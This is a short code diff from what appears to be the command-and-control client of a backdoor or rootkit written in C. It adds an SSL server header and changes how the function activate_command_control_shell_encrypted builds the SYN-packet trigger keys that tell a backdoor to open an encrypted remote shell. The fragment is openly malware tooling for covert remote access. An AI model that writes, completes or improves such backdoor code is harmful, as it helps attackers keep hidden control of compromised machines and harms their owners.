@@ -13,6 +13,7 @@
 #include "../common/constants.h"
 #include "../common/c&c.h"
 #include "../common/protocol.h"
+#include "include/sslserver.h"
 
 // For printing with colors
 #define KGRN  "\x1B[32m"
@@ -205,7 +206,7 @@ void activate_command_control_shell_encrypted(char* argv){
     char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_1;
     char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_2;
     //K3 with command to start the encrypted connection with the backdoor
-    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_3 + CC_PROT_K3_ENCRYPTED_SHELL_TRIGGER_V1;
+    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL;
     char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     strncpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
